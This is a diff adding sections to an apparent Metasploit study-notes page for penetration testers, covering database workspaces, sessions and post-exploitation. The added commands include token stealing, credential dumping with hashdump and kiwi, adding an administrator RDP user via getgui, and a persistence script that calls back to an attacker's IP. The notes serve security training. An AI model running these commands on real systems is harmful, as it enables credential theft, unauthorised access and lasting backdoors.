@@ -317,6 +317,28 @@ post/multi/manage/shell_to_meterpreter
 ```
 {% endcode %}
 
+### **Meterpreter migration**
+
+{% code overflow="wrap" %}
+```
+meterpreter> getuid
+meterpreter> ps
+meterpreter> steal_token <service running with system privileges>
+```
+{% endcode %}
+
+### **Dumping credentials**
+
+{% code overflow="wrap" %}
+```
+meterperter> hashdump
+         OR 
+meterpreter> load kiwi
+meterpreter> lsa_dump_sam
+meterpreter> lsa_dump_secrets
+```
+{% endcode %}
+
 ## Encoder&#x20;
 
 An **encoder modifies a payload's byte structure** while preserving its functionality.
@@ -372,3 +394,226 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -e x86/shikata
 
 <figure><img src="../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>
 
+## Databases&#x20;
+
+Without a database, managing large assessments becomes difficult.
+
+### Database Setup&#x20;
+
+#### Start PostgreSQL
+
+{% code overflow="wrap" %}
+```
+sudo systemctl start postgresql
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>
+
+#### Initialize MSF Database
+
+{% hint style="info" %}
+_For the first time we need to initialize the database. if database is already initialized and we reboot the system so we just have to start using `sudo msfdb start`._&#x20;
+
+* `sudo msfdb start` : Start the database
+* `sudo msfdb stop` : Stop the database
+{% endhint %}
+
+{% code overflow="wrap" %}
+```
+sudo msfdb init
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (580).png" alt=""><figcaption></figcaption></figure>
+
+#### Check status&#x20;
+
+{% hint style="info" %}
+_If `Connection type: postgresql` not showing then restart the Metasploit._&#x20;
+{% endhint %}
+
+{% code overflow="wrap" %}
+```bash
+db_status
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>
+
+_If database is already initialized and we want to run metasploit with database just use `sudo msfdb run` ._&#x20;
+
+<figure><img src="../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>
+
+#### Delete the database and stop it&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo msfdb delete
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (583).png" alt=""><figcaption></figcaption></figure>
+
+### Using the Database
+
+#### Workspaces&#x20;
+
+Think of workspaces as project folders.
+
+<figure><img src="../../.gitbook/assets/image (584).png" alt=""><figcaption></figcaption></figure>
+
+**Create a workspace ⇒**&#x20;
+
+{% code overflow="wrap" %}
+```bash
+workspace -a nexploit
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (585).png" alt=""><figcaption></figcaption></figure>
+
+#### Importing Scan Results&#x20;
+
+{% code overflow="wrap" %}
+```bash
+#Importing scan results
+db_import <xml file location> 
+
+# checking hosts 
+hosts 
+
+# checking open ports
+services
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (586).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (587).png" alt=""><figcaption></figcaption></figure>
+
+<details>
+
+<summary>Help section of <code>hosts</code> and <code>services</code></summary>
+
+* hosts
+
+<figure><img src="../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>
+
+* services
+
+<figure><img src="../../.gitbook/assets/image (589).png" alt=""><figcaption></figcaption></figure>
+
+</details>
+
+#### Finding hosts by protocol
+
+<figure><img src="../../.gitbook/assets/image (590).png" alt=""><figcaption></figcaption></figure>
+
+#### Credentials
+
+View stored credentials:
+
+```bash
+creds
+```
+
+Add manually:
+
+```bash
+creds add user:admin password:P@ssw0rd
+```
+
+#### Nmap in Metasploit&#x20;
+
+{% code overflow="wrap" %}
+```bash
+db_nmap <scan config> 
+```
+{% endcode %}
+
+{% hint style="info" %}
+_Scan results of `db_namp` will automatically be saved to the database. and no need to import._&#x20;
+{% endhint %}
+
+<figure><img src="../../.gitbook/assets/image (591).png" alt=""><figcaption></figcaption></figure>
+
+### Export database
+
+{% code overflow="wrap" %}
+```
+db_export -f xml backup.xml 
+
+db_import backup.xml
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (592).png" alt=""><figcaption></figcaption></figure>
+
+## Sessions&#x20;
+
+### List Sessions&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sessions
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (593).png" alt=""><figcaption></figcaption></figure>
+
+### Interacting with session&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sessions -i <id>
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (595).png" alt=""><figcaption></figcaption></figure>
+
+### kill session
+
+{% code overflow="wrap" %}
+```bash
+# kill a session
+sessions -k <id> 
+
+# kill all sessions
+sessions -K 
+```
+{% endcode %}
+
+<figure><img src="../../.gitbook/assets/image (596).png" alt=""><figcaption></figcaption></figure>
+
+## Post Exploitation and automating RDP&#x20;
+
+{% code overflow="wrap" %}
+```bash
+search post/windows/gather/enum_
+
+# start rdp with meterpreter
+run getgui -e
+run getgui -u <user> -p <password> #adds a user in administrator and RDP group
+
+# method - 2
+search post/windows/manage/enable_rdp
+```
+{% endcode %}
+
+## Maintaining Persistence&#x20;
+
+{% code overflow="wrap" %}
+```bash
+search windows/local/persistence_service
+search exploit/windows/local/registry_persistence
+
+#OR
+
+run persistence -X -i 5 -p 4444 -r <your-ip>
+# -X: configures script to run on startup
+# -i 5: interval for how often to attempt to connect back to attacker's machine
+# -p 4444: Set's the port 
+# -r <IP>: Replace IP with attacker's IP. 
+```
+{% endcode %}
